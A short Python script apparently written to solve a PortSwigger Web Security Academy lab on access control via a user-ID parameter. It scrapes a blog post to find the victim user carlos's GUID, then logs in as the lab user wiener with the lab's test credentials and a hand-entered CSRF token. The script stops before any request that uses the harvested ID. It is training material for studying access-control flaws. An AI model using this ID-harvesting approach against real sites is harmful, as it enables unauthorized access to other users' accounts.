# Lab: User ID controlled by request parameter, with unpredictable user IDs

import requests

base = "https://0a8000290432936c802381c100ec00b3.web-security-academy.net/post?postId=3"
'''
<a href='/blogs?userId=fa5ac167-66da-4a24-9b18-aeac85db32d5'>carlos</a>
'''
s = requests.Session()

r = s.get(base)
print(r.text)

base = "https://0a8000290432936c802381c100ec00b3.web-security-academy.net"
print(s.get(f"{base}/login").text)
csrf=input("input csrf: ")
r = s.post(f"{base}/login", data={"username": "wiener", "password": "peter", "csrf": csrf})
print(r.text)

